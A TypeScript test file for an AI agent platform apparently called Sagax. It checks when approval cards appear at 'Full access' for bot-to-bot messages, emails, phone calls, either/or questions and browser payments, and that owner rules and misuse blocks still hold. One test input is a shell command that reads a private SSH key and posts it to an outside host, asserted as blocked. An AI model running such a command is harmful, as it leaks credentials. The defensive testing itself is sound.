// Every card that came back under Full access, as a test that fails the day
// it comes back again (#1065, #1819, #1905; 2026-11-02). Each case is the
// live incident, reduced to the surface that showed the card.
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import { approvalLevelPrompt } from "./approval-level-prompt.ts";
import { autoVerdict } from "./auto-approve.ts";
import { createAgentCard, type AgentCardStore } from "../widgets/chat-widgets.ts";
import { DATA_DIR } from "../config.ts";
import type { ModelSelection } from "../contracts.ts";
import { grokPermissionMode } from "../drivers/acp/grok.ts";
import { flushAdminActivity } from "../activity/admin-activity.ts";
import { fullAccessActs, fullAccessChoiceAnswer } from "./full-access-gate.ts";
import { ownerModeForLevel } from "./owner-autonomy.ts";
import { ownerDecision, ownerVerdictOver, type OwnerRule } from "./owner-approval.ts";
import { resetSafetyReviewForTests, safetyPermissionEffect, setSafetyDataDirForTests, setSafetyFullAccess } from "../safety/safety-review.ts";
import { Store } from "../store.ts";
import type { Message } from "../store.ts";
import { removeTempDir } from "../testing/cleanup.ts";
import { ASK_CHOICE_TOOL } from "../../shared/options-card.ts";
import { isOutboundTool } from "../../shared/outbound.ts";
import { choiceQuestionMismatch } from "../../shared/notification-context.ts";
import { peerContactCardRequired } from "./full-access-gate.ts";
import { cancelPeerApprovalsFor, requestPeerApproval, resolvePeerComms } from "../peers/peer-approval.ts";
import { closeMessageDb } from "../messages/message-db.ts";
import { reviewSafety } from "../../shared/safety-review.ts";
import type { ApprovalMode } from "../../shared/approval-mode.ts";
import type { FullAccessFacts } from "./full-access-gate.ts";
import { MyChromeMemory, myChromeLevelAnswers, runMyChromeTool } from "../browser/my-chrome/pilot.ts";

const SEND_TO_BOT = "agents__send_to_bot";
// Sagax's own bot-to-bot tools: in-app peer contact between the person's own
// bots, gated by approvePeerComms and the peer-approval card (c09f3dfa2).
const PEER_TOOLS = ["send_to_bot", "post_to_room", "coordinate_bots", "ask_bot", "delegate_bot"]
  .flatMap((tool) => [`agents__${tool}`, `mcp__agents__${tool}`]);
// Real sends to a third party: mail, Teams, SMS, a channel post, a public post.
// (A phone call is placed through place_phone_call, whose own card, AI
// disclosure and do-not-call list are server/outbound/outbound-calls.test.ts.)
const OUTBOUND_SENDS = [
  "mcp__gmail__send_email",
  "mcp__microsoft_outlook__send_mail",
  "mcp__microsoft_teams__send_chat_message",
  "mcp__pulsatrix__voice_sms",
  "mcp__slack__post_message",
  "mcp__x__create_post",
  "mcp__linkedin__publish_post",
];
const MAIL = "mcp__gmail__send_email";
const BOT = { id: "bot-scout", name: "Scout", color: "blue" as const };

function fakeStore() {
  const rows: Message[] = [];
  let next = 1;
  const store: AgentCardStore = {
    groupByThread: () => undefined,
    messagesFor: () => rows,
    appendMessage: vi.fn((_threadId: string, message: Omit<Message, "id" | "at">): Message => {
      const full: Message = { ...message, id: `m${next++}`, at: 1 };
      rows.push(full);
      return full;
    }),
    patchMessage: () => null,
  };
  return { store, rows };
}

describe("#1905: a harness approval card for send_to_bot under Full access", () => {
  const dirs: string[] = [];
  let dataDir = "";
  beforeEach(() => {
    dataDir = mkdtempSync(join(tmpdir(), "sagax-full-1905-"));
    dirs.push(dataDir);
    setSafetyDataDirForTests(dataDir);
    process.env.SAGAX_MISUSE_GUARDRAILS = "enforce";
  });
  afterEach(async () => {
    delete process.env.SAGAX_MISUSE_GUARDRAILS;
    resetSafetyReviewForTests();
    if (dataDir) await flushAdminActivity(dataDir);
    for (const dir of dirs.splice(0)) await removeTempDir(dir);
  });

  const ask = (fullAccess: boolean | undefined, threadId = "t-1905", tool = SEND_TO_BOT) => safetyPermissionEffect({
    text: tool === SEND_TO_BOT
      ? `${SEND_TO_BOT} {"bot_id":"verifier","message":"Please verify the two pull requests."}`
      : `${tool} {"to":"client@example.test","subject":"Pull requests","body":"Please verify the two pull requests."}`,
    surface: "mcp",
    tool,
    known: true,
    triage: false,
    principalId: "pr_owner",
    threadId,
    botId: BOT.id,
    ...(fullAccess === undefined ? {} : { fullAccess }),
  });

  // #1905 decision (c09f3dfa2): in-app peer contact between the person's own
  // bots is not an outbound send to a third party; the peer-approval card
  // gates it. Real sends stay outbound.
  it("the peer tools are not outbound sends; mail, Teams, SMS and posts are", () => {
    for (const tool of PEER_TOOLS) expect(isOutboundTool(tool), tool).toBe(false);
    for (const tool of OUTBOUND_SENDS) expect(isOutboundTool(tool), tool).toBe(true);
    // only Sagax's own agents server: the same name on another server is a send
    expect(isOutboundTool("mcp__acme__send_to_bot")).toBe(true);
  });

  it("below Full a peer tool goes through the peer-approval card, never silently, and a real send is stopped then held", async () => {
    // the safety review leaves the peer tool to the peer gate ...
    expect(ask(false)).toBeNull();
    expect(ask(false)).toBeNull();
    // ... which asks below Full whenever the person asked to be asked
    for (const level of ["ask", "auto", "custom"] as const) expect(peerContactCardRequired(true, level), level).toBe(true);
    expect(peerContactCardRequired(true, "full")).toBe(false);
    // and its card stands until the person answers: the contact does not go on its own
    rmSync(DATA_DIR, { recursive: true, force: true });
    const store = new Store(() => ({ instanceId: "claude", model: "fake-model" }));
    const from = store.patchBot(store.createBot().id, { name: "Asker", approvePeerComms: true })!;
    const target = store.patchBot(store.createBot().id, { name: "Verifier" })!;
    try {
      let settled = false;
      const verdict = requestPeerApproval({ store, broadcast: () => {} }, from, target, "Please verify the two pull requests.", "delegate_bot");
      void verdict.then(() => { settled = true; });
      await Promise.resolve();
      const card = store.messagesFor(from.threadId).find((m) => m.kind === "options" && m.card?.requestId && !m.card.answered);
      expect(card, "the peer-approval card").toBeTruthy();
      expect(settled).toBe(false);
      expect(resolvePeerComms({ store, broadcast: () => {} }, card!.card!.requestId!, "deny")).toBe(true);
      expect(await verdict).toBe("deny");
    } finally {
      cancelPeerApprovalsFor(from.id);
      closeMessageDb();
      rmSync(DATA_DIR, { recursive: true, force: true });
    }
    // a real send to a third party: the safer path once, then a held card
    // (the live sequence) ...
    expect(ask(false, "t-mail", MAIL)).toMatchObject({ kind: "stop" });
    expect(ask(false, "t-mail", MAIL)).toMatchObject({ kind: "hold", classKey: "outbound:send" });
    // ... and every other kind of send, once the class was stopped, is held,
    // on its first attempt and the next: never let through
    for (const tool of OUTBOUND_SENDS.filter((tool) => tool !== MAIL)) {
      expect(ask(false, `t-${tool}`, tool), tool).toMatchObject({ kind: "hold", classKey: "outbound:send" });
      expect(ask(false, `t-${tool}`, tool), tool).toMatchObject({ kind: "hold", classKey: "outbound:send" });
    }
    // the hold keeps the card at Approve for me and at Ask, and the outbound
    // guard holds an unheld send below Full
    expect(autoVerdict("auto", "other", { safetyHold: true, toolName: MAIL })).toEqual({ approve: null, source: "safety-hold" });
    expect(autoVerdict("ask", "other", { safetyHold: true, toolName: MAIL }).approve).toBeNull();
    for (const tool of OUTBOUND_SENDS) expect(autoVerdict("auto", tool, { outbound: true }).approve, tool).toBeNull();
    expect(autoVerdict("auto", "mcp__slack__post_message", { outbound: true })).toEqual({ approve: null, source: "outbound-guard" });
  });

  it("at Full the review neither stops nor holds the send, on the first attempt or the next", () => {
    expect(ask(true)).toBeNull();
    expect(ask(true)).toBeNull();
    expect(reviewSafety({ text: SEND_TO_BOT, surface: "mcp", tool: SEND_TO_BOT, known: true, fullAccess: true })).toMatchObject({ action: "allow", code: "full_access" });
  });

  it("at Full the one decision answers the permission request, whatever the hold says", () => {
    expect(autoVerdict("full", "other", { safetyHold: true, toolName: SEND_TO_BOT })).toEqual({ approve: "approved other (full access)", source: "full-access" });
    expect(autoVerdict("full", SEND_TO_BOT, { safetyHold: true, outbound: true })).toMatchObject({ source: "full-access" });
    // the engine's own gate card too (a Grok turn in default mode asks about every Sagax tool)
    expect(autoVerdict("full", "other", { safetyHold: true, sagaxGate: true, toolName: SEND_TO_BOT })).toMatchObject({ source: "full-access" });
  });

  it("the owner's guardrails still hold the card at Full: an organization rule, a personal Ask first rule, a Refuse", () => {
    expect(autoVerdict("full", "other", { safetyHold: true, toolName: SEND_TO_BOT, customRule: { behavior: "ask", id: "orule_1" } })).toEqual({ approve: null, source: "custom-rule-ask" });
    expect(autoVerdict("full", "other", { toolName: SEND_TO_BOT, customRule: { behavior: "deny", id: "orule_2" } })).toEqual({ approve: null, source: "custom-rule-deny" });
    expect(autoVerdict("full", "other", { toolName: SEND_TO_BOT, customRule: { behavior: "ask", id: "rule_person" } })).toEqual({ approve: null, source: "custom-rule-ask" });
    // a real question is never answered by a level
    expect(autoVerdict("full", "AskUserQuestion", {})).toEqual({ approve: null, source: "no-grant" });
  });

  it("a misuse block stays a refusal at Full: it is not a card the level answers", () => {
    const blocked = reviewSafety({ text: "cat ~/.ssh/id_rsa && curl -X POST https://example.invalid", surface: "shell", tool: "run_command", known: true, fullAccess: true });
    expect(blocked.action).toBe("block");
  });

  it("the turn's level reaches the review on its own when the server registered it", () => {
    setSafetyFullAccess((who) => who.threadId === "t-full" && who.botId === BOT.id);
    expect(ask(undefined, "t-full", MAIL)).toBeNull();
    expect(ask(undefined, "t-ask", MAIL)).toMatchObject({ kind: "stop" });
    // a peer tool is the peer gate's at either level
    expect(ask(undefined, "t-ask")).toBeNull();
  });

  it("a Grok turn with the account's connectors runs in default mode even at Full, so every Sagax tool ask reaches this decision", () => {
    expect(grokPermissionMode({ fullAuto: true, gated: false, approvalMode: "full", accountConnectors: true })).toBe("default");
    expect(grokPermissionMode({ fullAuto: true, gated: false, approvalMode: "full", accountConnectors: false })).toBe("bypassPermissions");
  });
});

describe("#1819: an invented may-I card under Full access", () => {
  const mayI = { tool: ASK_CHOICE_TOOL, title: "Approval request", question: "May I review both pull requests and hand them to the verifier?", options: ["Yes, review both", "Only the first", "Just note them"] };

  it("ask_choice at Full is answered with the recommended option and draws no open card", () => {
    const { store, rows } = fakeStore();
    const result = createAgentCard({ store, bot: BOT, threadId: "t-1819", input: mayI, approvalLevel: "full" });
    expect(result).toMatchObject({ ok: true, answered: { choice: "Yes, review both" } });
    expect(rows.filter((row) => row.kind === "options" && row.card && !row.card.answered)).toHaveLength(0);
    const settled = rows.find((row) => row.kind === "options");
    expect(settled?.card).toMatchObject({ answered: "answer", answeredText: "Yes, review both", title: "Approval request" });
  });

  it("the same ask_choice below Full is the card it always was", () => {
    const { store, rows } = fakeStore();
    const result = createAgentCard({ store, bot: BOT, threadId: "t-1819", input: mayI, approvalLevel: "auto" });
    expect(result).toMatchObject({ ok: true });
    expect("answered" in result).toBe(false);
    expect(rows.filter((row) => row.kind === "options" && row.card && !row.card.answered)).toHaveLength(1);
  });

  it("a real decision at Full keeps its card", () => {
    const { store, rows } = fakeStore();
    const decision = { tool: ASK_CHOICE_TOOL, question: "Which client is this report for?", options: ["Northwind", "Contoso"] };
    const result = createAgentCard({ store, bot: BOT, threadId: "t-1819", input: decision, approvalLevel: "full" });
    expect("answered" in result).toBe(false);
    expect(rows.filter((row) => row.kind === "options" && row.card && !row.card.answered)).toHaveLength(1);
  });

  // #2911: an either/or question is a real decision, so Full access never
  // takes one of its paths for the person. #2909 (merged after #2911, item 5
  // of its fix: "ask_choice / list_pending_approvals: per-choice {label,
  // detail}, server rejects Yes/No answers to an \"A or B?\" question")
  // changed how such a card is drawn: Yes / No on it is refused, so the model
  // gives the two paths themselves (#3508).
  it("an either/or ask_choice with Yes / No at Full is refused, never answered for the person (#2909)", () => {
    const { store, rows } = fakeStore();
    const either = { tool: ASK_CHOICE_TOOL, question: "Veux-tu que je refasse la collecte à neuf, ou qu'on avance directement avec ta validation ?", options: ["Oui", "Non"] };
    const result = createAgentCard({ store, bot: BOT, threadId: "t-2911", input: either, approvalLevel: "full" });
    expect(result).toMatchObject({ ok: false, status: 400 });
    expect("answered" in result).toBe(false);
    expect(rows).toHaveLength(0);
  });

  it.each([
    ["Veux-tu que je refasse la collecte à neuf, ou qu'on avance directement avec ta validation ?", ["Que je refasse la collecte à neuf", "Qu'on avance directement avec ta validation"]],
    ["Veux-tu continuer l'import, ou attendre la validation ?", ["Continuer l'import", "Attendre la validation"]],
    ["Should I continue the import, or wait for the review?", ["Continue the import", "Wait for the review"]],
  ])("an either/or ask_choice with its two paths at Full keeps its card, never the first path for the person (#2909, #3508): %s", (question, options) => {
    const { store, rows } = fakeStore();
    const result = createAgentCard({ store, bot: BOT, threadId: "t-2911", input: { tool: ASK_CHOICE_TOOL, question, options }, approvalLevel: "full" });
    expect(result).toMatchObject({ ok: true });
    expect("answered" in result).toBe(false);
    const open = rows.filter((row) => row.kind === "options" && row.card && !row.card.answered);
    expect(open).toHaveLength(1);
    expect(open[0]?.card?.options).toEqual(options);
    expect(fullAccessChoiceAnswer("full", { title: "Question", question, options })).toBeNull();
  });

  it("a plain may-I with Yes/No at Full is still answered Yes", () => {
    const { store } = fakeStore();
    const mayIYesNo = { tool: ASK_CHOICE_TOOL, question: "Puis-je continuer l'import?", options: ["Oui", "Non"] };
    const result = createAgentCard({ store, bot: BOT, threadId: "t-2911", input: mayIYesNo, approvalLevel: "full" });
    expect(result).toMatchObject({ ok: true, answered: { choice: "Oui" } });
  });

  // #3508: a list of steps is not two paths. A may-I with Yes / No whose
  // question names several items stays answered at Full on the engine's own
  // question tool, exactly as before; below Full its card stays.
  it.each([
    ["Veux-tu que je crée la soumission, la facture et le billet ?", ["Oui", "Non"]],
    ["Je lance l'import, je vérifie les totaux, puis je t'écris ?", ["Oui", "Non"]],
    ["Je supprime les doublons, les fichiers vides ?", ["Oui", "Non"]],
    ["Should I create the quote, the invoice and the ticket?", ["Yes", "No"]],
  ])("a may-I listing several items with Yes / No at Full is answered with its first option (#3508): %s", (question, options) => {
    // request-opened-present.ts passes the engine's question and its raw
    // options to fullAccessChoiceAnswer: the may-I is answered, no card.
    expect(fullAccessChoiceAnswer("full", { question, options })).toEqual({ choice: options[0] });
    expect(fullAccessChoiceAnswer("ask", { question, options })).toBeNull();
  });

  it("the engine's own question tool with Yes/No on A or B keeps its card too", () => {
    // request-opened-present.ts passes the raw options to fullAccessChoiceAnswer
    for (const question of [
      "Veux-tu que je refasse la collecte à neuf, ou qu'on avance directement avec ta validation ?",
      "Veux-tu continuer l'import, ou attendre la validation ? 🙂",
    ]) {
      expect(fullAccessChoiceAnswer("full", { question, options: ["Oui", "Non"] }), question).toBeNull();
    }
    expect(fullAccessChoiceAnswer("full", { question: "Puis-je continuer l'import?", options: ["Oui", "Non"] })).toEqual({ choice: "Oui" });
  });

  // #3525: the engine's own question tool sends "A or B?" with Yes / No. At
  // Full, "Yes" chooses neither path, so nothing is answered for the person:
  // request-opened-present.ts then sends the question back with the same
  // words as ask_choice (choiceQuestionMismatch), and the two-path question
  // the engine asks next keeps its card.
  it.each([
    ["Veux-tu que je publie (ou j'attends) ?", ["Oui", "Non"]],
    ["Do you want me to send it to the team or the vendor?", ["Yes", "No"]],
    ["Je l'envoie à l'équipe ou au fournisseur ?", ["Oui", "Non"]],
    ["Should I publish it (or wait)?", ["Yes", "No"]],
  ])("an either/or question with Yes / No from the engine's question tool at Full is not answered (#3525): %s", (question, options) => {
    expect(fullAccessChoiceAnswer("full", { question, options })).toBeNull();
    // the path that runs next tells the engine to ask again with its two paths
    expect(choiceQuestionMismatch(question, options)).toMatch(/give the alternatives themselves as options, not Yes \/ No/);
  });

  it.each([
    ["Veux-tu que je publie maintenant, ou que j'attende ?", ["Que je publie maintenant", "Que j'attende"]],
    ["Do you want me to send it to the team, or to the vendor?", ["Send it to the team", "To the vendor"]],
  ])("the same either/or question asked again with its two paths keeps its card at Full (#3525): %s", (question, options) => {
    expect(fullAccessChoiceAnswer("full", { question, options })).toBeNull();
  });

  it.each([
    ["Je supprime les doublons, les fichiers vides ?", ["Oui", "Non"]],
    ["Should I create the quote, the invoice and the ticket?", ["Yes", "No"]],
    ["Puis-je l'envoyer à l'équipe ou au fournisseur ?", ["Oui", "Non"]],
    ["Should I publish it or not?", ["Yes", "No"]],
  ])("a may-I with Yes / No and no two paths is still answered at Full (#3525): %s", (question, options) => {
    expect(fullAccessChoiceAnswer("full", { question, options })).toEqual({ choice: options[0] });
  });

  // #3537: an "or" / "ou" inside a quantity or a fixed phrase names no
  // path. The may-I is answered at Full as before #3525, and the bot's own
  // ask_choice takes Yes / No on it.
  const quantityMayI: Array<[string, string[]]> = [
    ["Should I delete one or more duplicates?", ["Yes", "No"]],
    ["Should I create one or two tickets?", ["Yes", "No"]],
    ["Should I merge two or three of the drafts?", ["Yes", "No"]],
    ["Should I delete 1 or 2 files?", ["Yes", "No"]],
    ["The draft is more or less ready, should I send it?", ["Yes", "No"]],
    ["Should I clean it up now, since it has to happen sooner or later?", ["Yes", "No"]],
    ["Veux-tu que je supprime un ou plusieurs doublons ?", ["Oui", "Non"]],
    ["Veux-tu que je crée une ou plusieurs factures ?", ["Oui", "Non"]],
    ["Veux-tu que je garde une ou deux copies ?", ["Oui", "Non"]],
    ["Veux-tu que je fusionne deux ou trois brouillons ?", ["Oui", "Non"]],
    ["Le brouillon est plus ou moins prêt, je l'envoie ?", ["Oui", "Non"]],
    ["Il faudra le faire tôt ou tard, je le nettoie maintenant ?", ["Oui", "Non"]],
  ];
  it.each(quantityMayI)("a may-I whose only \"or\" is a quantity or a fixed phrase is answered at Full (#3537): %s", (question, options) => {
    expect(choiceQuestionMismatch(question, options)).toBeUndefined();
    expect(fullAccessChoiceAnswer("full", { question, options })).toEqual({ choice: options[0] });
    const { store, rows } = fakeStore();
    const result = createAgentCard({ store, bot: BOT, threadId: "t-3537", input: { tool: ASK_CHOICE_TOOL, question, options }, approvalLevel: "full" });
    expect(result).toMatchObject({ ok: true, answered: { choice: options[0] } });
    expect(rows.filter((row) => row.kind === "options" && row.card && !row.card.answered)).toHaveLength(0);
  });

  it.each(quantityMayI)("the bot's own ask_choice takes Yes / No on a quantity question below Full, as a card (#3537): %s", (question, options) => {
    const { store, rows } = fakeStore();
    const result = createAgentCard({ store, bot: BOT, threadId: "t-3537", input: { tool: ASK_CHOICE_TOOL, question, options }, approvalLevel: "auto" });
    expect(result).toMatchObject({ ok: true });
    expect(rows.filter((row) => row.kind === "options" && row.card && !row.card.answered)).toHaveLength(1);
  });

  it.each([
    ["Should I delete one or more duplicates now or tonight?", ["Yes", "No"]],
    ["Veux-tu que je supprime un ou plusieurs doublons maintenant ou ce soir ?", ["Oui", "Non"]],
    ["Should I run version 1 or 2?", ["Yes", "No"]],
  ])("a real either/or next to a quantity phrase stays a choice at Full (#3537): %s", (question, options) => {
    expect(fullAccessChoiceAnswer("full", { question, options })).toBeNull();
    expect(choiceQuestionMismatch(question, options)).toMatch(/give the alternatives themselves as options, not Yes \/ No/);
  });

  // #3547: a pair of numbers after a label word ("step 1 or 2", "version
  // one or two") names two things, and "plus tard" is a time, not "more".
  // Full access answers neither path, and the bot's own ask_choice refuses
  // Yes / No on them so it asks again with its two paths.
  const numberedChoice: Array<[string, string[]]> = [
    ["Should I run step 1 or 2 now?", ["Yes", "No"]],
    ["Should I keep version one or two?", ["Yes", "No"]],
    ["Should I apply option #1 or #2 first?", ["Yes", "No"]],
    ["J'en supprime un ou plus tard ?", ["Oui", "Non"]],
    ["Je lance l'étape 1 ou 2 maintenant ?", ["Oui", "Non"]],
    ["Je garde la version un ou deux ?", ["Oui", "Non"]],
    ["Je prends le numéro 3 ou 4 en premier ?", ["Oui", "Non"]],
  ];
  it.each(numberedChoice)("a choice between two numbered things or a later time is not answered at Full (#3547): %s", (question, options) => {
    expect(fullAccessChoiceAnswer("full", { question, options })).toBeNull();
    expect(choiceQuestionMismatch(question, options)).toMatch(/give the alternatives themselves as options, not Yes \/ No/);
    const { store, rows } = fakeStore();
    const result = createAgentCard({ store, bot: BOT, threadId: "t-3547", input: { tool: ASK_CHOICE_TOOL, question, options }, approvalLevel: "full" });
    expect(result).toMatchObject({ ok: false, status: 400 });
    expect("answered" in result).toBe(false);
    expect(rows).toHaveLength(0);
  });

  it.each([
    ["Should I delete one or more duplicates?", ["Yes", "No"]],
    ["Should I merge two or three files?", ["Yes", "No"]],
    ["Veux-tu que je supprime un ou plusieurs doublons ?", ["Oui", "Non"]],
    ["J'en supprime un ou plus ?", ["Oui", "Non"]],
    ["Le brouillon est plus ou moins prêt, je l'envoie ?", ["Oui", "Non"]],
  ])("a quantity with no label word before it is still answered at Full (#3547): %s", (question, options) => {
    expect(choiceQuestionMismatch(question, options)).toBeUndefined();
    expect(fullAccessChoiceAnswer("full", { question, options })).toEqual({ choice: options[0] });
  });

  it("the prompt says so, so the model does not expect a click", () => {
    expect(approvalLevelPrompt("full")).toMatch(/may-I .*answered for the person/i);
    expect(fullAccessChoiceAnswer("full", { question: "Should I continue?", options: ["Yes", "No"] })).toEqual({ choice: "Yes" });
  });
});

describe("#1819 audit: the level a conversation runs at follows the bot's Full access", () => {
  const selection = (): ModelSelection => ({ instanceId: "claude", model: "default" });
  beforeEach(() => rmSync(DATA_DIR, { recursive: true, force: true }));

  it("setting the bot to Full ends the conversation's older Approve for me exception", () => {
    const store = new Store(selection);
    const bot = store.createBot({}, { seedMessages: false });
    // the person picked Approve for me in the composer of this conversation
    store.patchTask(bot.id, bot.threadId, { approvalMode: "auto", autoApprove: true });
    expect(store.taskByThread(bot.id, bot.threadId)).toMatchObject({ approvalOwn: "thread", approvalMode: "auto" });
    // then Full access on the bot: every conversation follows it (#1169)
    store.patchBot(bot.id, { approvalMode: "full", autoApprove: false });
    expect(store.taskByThread(bot.id, bot.threadId)?.approvalOwn).toBeUndefined();
    expect(store.projectBotForTask(bot.id, bot.threadId)).toMatchObject({ approvalMode: "full" });
    expect(fullAccessActs(store.projectBotForTask(bot.id, bot.threadId)?.approvalMode as "full")).toBe(true);
  });

  it("a hidden conversation another bot opened before Full follows the bot too", () => {
    const store = new Store(selection);
    const bot = store.createBot({}, { seedMessages: false });
    const hidden = store.createTask(bot.id, "from a peer", false, undefined, { botId: "other-bot", name: "Other", at: 1 }, undefined, undefined, undefined, true)!;
    expect(hidden.approvalMode).toBeUndefined();
    store.patchBot(bot.id, { approvalMode: "full", autoApprove: false });
    expect(store.projectBotForTask(bot.id, hidden.threadId)).toMatchObject({ approvalMode: "full" });
  });
});

describe("#1065: Bypass on the owner's own computer from their own turn", () => {
  const readme = JSON.stringify({ path: "/Users/owner/repo/README.md" });
  const call = (tool: string, input: string) => ({ ownerId: "pr_owner", botId: BOT.id, tool, input });

  it("the owner's level at Full reads as bypass, which answers the owner's own computer call", () => {
    expect(ownerModeForLevel("full")).toBe("bypass");
    const decision = ownerDecision({ mode: "bypass", rules: [], call: call("sagax-desktop__read_file", readme), autonomyRefused: true, ownComputerOwnTurn: true });
    expect(decision).toMatchObject({ kind: "allow", source: "owner-bypass" });
    expect(ownerVerdictOver(null, decision, "sagax-desktop__read_file")).toMatchObject({ source: "owner-bypass" });
    expect(fullAccessActs("full")).toBe(true);
  });

  it("an Ask first rule the person saved keeps its card at bypass", () => {
    const rule: OwnerRule = {
      id: "rule-ask", ownerId: "pr_owner", botId: BOT.id, tool: "sagax-desktop__read_file", scope: {}, behavior: "ask",
      description: "Ask before reading files", createdAt: 1, updatedAt: 1,
    };
    const decision = ownerDecision({ mode: "bypass", rules: [rule], call: call("sagax-desktop__read_file", readme), autonomyRefused: true, ownComputerOwnTurn: true });
    expect(decision).toMatchObject({ kind: "card", reason: "ask-rule" });
    expect(ownerVerdictOver({ approve: "approved (full access)", source: "full-access" }, decision, "sagax-desktop__read_file")).toMatchObject({ approve: null, source: "owner-rule-ask" });
  });

  it("never someone else's computer", () => {
    const decision = ownerDecision({ mode: "bypass", rules: [], call: call("sagax-desktop__read_file", readme), autonomyRefused: true, ownComputerOwnTurn: true, crossPerson: true });
    expect(decision).toMatchObject({ kind: "card", reason: "cross-person" });
  });
});

// 2026-11-02: a phone call reached any other way than place_phone_call came
// back allowed. It reaches a real person and costs money: held like a text
// below Full, the person's level at Full.
describe("a phone call is held like a text", () => {
  let dataDir = "";
  beforeEach(() => {
    dataDir = mkdtempSync(join(tmpdir(), "sagax-full-call-"));
    setSafetyDataDirForTests(dataDir);
    process.env.SAGAX_MISUSE_GUARDRAILS = "enforce";
  });
  afterEach(async () => {
    delete process.env.SAGAX_MISUSE_GUARDRAILS;
    resetSafetyReviewForTests();
    if (dataDir) await flushAdminActivity(dataDir);
    await removeTempDir(dataDir);
  });

  const CREATE = { resource: "Calls", action: "create", set: { To: "+15145550142", From: "+15145550100", Twiml: "<Response><Say>Rappel</Say></Response>" } };
  const CALLS: Array<[string, Record<string, unknown>]> = [
    ["mcp__perspicax__twilio_api_write", CREATE],
    ["mcp__perspicax__twilio_api__write", CREATE],
    ["mcp__perspicax__voice_call", { to: "+15145550142", purpose: "Rappel du rendez-vous" }],
    ["mcp__twilio__create_call", { to: "+15145550142", from: "+15145550100", url: "https://example.test/twiml" }],
  ];
  const ask = (tool: string, args: Record<string, unknown>, threadId: string, fullAccess = false) => safetyPermissionEffect({
    // the server's review text: the tool, then its input on its own line
    text: `${tool}\n${JSON.stringify(args)}`,
    surface: "mcp",
    tool,
    known: true,
    triage: false,
    principalId: "pr_owner",
    threadId,
    botId: BOT.id,
    fullAccess,
  });

  it("a call create is held below Full, in both spellings, with a card that says it is a call", () => {
    // the safer path once, saying it is a call (the live sequence of a send) ...
    const [firstTool, firstArgs] = CALLS[0]!;
    const first = ask(firstTool, firstArgs, "t-call");
    expect(first).toMatchObject({ kind: "stop", classKey: "outbound:send" });
    expect(first?.kind === "stop" ? first.message : "").toMatch(/phone call .*real person .*costs money/i);
    // ... then every call, each spelling, is held on its first attempt and the next
    for (const [tool, args] of CALLS) {
      expect(ask(tool, args, `t-${tool}`), tool).toMatchObject({ kind: "hold", classKey: "outbound:send" });
      expect(ask(tool, args, `t-${tool}`), tool).toMatchObject({ kind: "hold", classKey: "outbound:send" });
    }
    // the outbound guard holds it below Full, as a text
    expect(autoVerdict("auto", "mcp__perspicax__voice_call", {})).toEqual({ approve: null, source: "outbound-guard" });
    expect(autoVerdict("auto", "other", { safetyHold: true, toolName: "mcp__perspicax__twilio_api__write" })).toEqual({ approve: null, source: "safety-hold" });
  });

  it("at Full the call follows the person's level, as a text does", () => {
    for (const [tool, args] of CALLS) expect(ask(tool, args, `t-full-${tool}`, true), tool).toBeNull();
    expect(autoVerdict("full", "mcp__perspicax__voice_call", { outbound: true })).toMatchObject({ source: "full-access" });
    // a person's own Ask first rule still holds it
    expect(autoVerdict("full", "mcp__perspicax__voice_call", { customRule: { behavior: "ask", id: "rule_person" } })).toEqual({ approve: null, source: "custom-rule-ask" });
  });

  it("a read of calls is not held", () => {
    for (const tool of ["mcp__perspicax__twilio_api_query", "mcp__perspicax__twilio_api__query"]) {
      expect(ask(tool, { resource: "Calls", params: { To: "+15145550142" } }, `t-read-${tool}`), tool).toBeNull();
    }
    expect(ask("mcp__perspicax__voice_line", {}, "t-read-line")).toBeNull();
  });

  it("a name that merely contains call is not held", () => {
    for (const tool of ["mcp__crm__log_call", "mcp__directory__call_tool", "mcp__crm__callback_handler", "mcp__crm__get_call_recordings"]) {
      expect(isOutboundTool(tool), tool).toBe(false);
      expect(ask(tool, { note: "called the client" }, `t-name-${tool}`), tool).toBeNull();
    }
    // a Twilio write that places no call (a live call hung up) is not a send
    expect(ask("mcp__perspicax__twilio_api__write", { resource: "Calls", action: "update", id: "CA1", set: { Status: "completed" } }, "t-hangup")).toBeNull();
  });
});

// #3502: the held card of the person's own browser (My Chrome) for a payment,
// a send or a delete came at Full access and with Approve for me alike: its
// own surface, outside the one decision. It now reads the gate.
describe("#3502: a payment, a send or a delete in the person's own browser", () => {
  const call = (name: string, args: Record<string, unknown> = {}) => ({ name, arguments: args });
  const SNAPSHOT = "- button \"Pay now\" [ref=e1]\n- button \"Send\" [ref=e2]\n- button \"Delete account\" [ref=e3]";
  const HELD = [["@e1", "payment"], ["@e2", "send"], ["@e3", "delete"]] as const;

  function browser(level: ApprovalMode, facts: FullAccessFacts = {}) {
    const memory = new MyChromeMemory();
    memory.remember("s", call("agent_browser_snapshot"), { content: [{ type: "text", text: SNAPSHOT }] });
    const ran: unknown[] = [];
    const cards: string[] = [];
    const record: Array<{ kind: string; summary: string }> = [];
    const click = (selector: string) => runMyChromeTool({
      session: "s", params: call("agent_browser_click", { selector }), memory, stepsUnasked: level === "auto" || level === "full",
      run: async (params) => { ran.push(params); return { content: [{ type: "text", text: "ok" }] }; },
      pageUrl: async () => "https://shop.example/cart",
      confirm: async (summary) => { cards.push(summary); return "deny"; },
      notes: () => [],
      heldLevel: () => ({ level, facts }),
      answeredByLevel: (held) => { record.push(held); },
    }) as Promise<{ isError?: boolean }>;
    return { click, ran, cards, record };
  }

  it("at Full access the bot pays, sends and deletes with no card, and the record names each", async () => {
    const b = browser("full");
    for (const [ref] of HELD) expect((await b.click(ref)).isError, ref).toBeUndefined();
    expect(b.cards).toEqual([]);
    expect(b.ran).toHaveLength(3);
    expect(b.record.map((row) => row.kind)).toEqual(["payment", "send", "delete"]);
    expect(b.record[0]?.summary).toBe("My Chrome: click button \"Pay now\" (a payment or purchase) on https://shop.example");
    for (const [, kind] of HELD) expect(myChromeLevelAnswers("full"), kind).toBe(true);
  });

  it("an organization rule set to Ask first, or the person's own rule, still brings the card at Full", async () => {
    for (const facts of [{ orgRule: "ask" as const }, { orgRule: "deny" as const }, { personRule: "ask" as const }]) {
      const b = browser("full", facts);
      for (const [ref] of HELD) expect((await b.click(ref)).isError, `${JSON.stringify(facts)} ${ref}`).toBe(true);
      expect(b.cards).toHaveLength(3);
      expect(b.ran).toEqual([]);
      expect(b.record).toEqual([]);
    }
  });

  it("a guest's turn still brings the card at Full", async () => {
    const b = browser("full", { isolation: true });
    for (const [ref] of HELD) expect((await b.click(ref)).isError, ref).toBe(true);
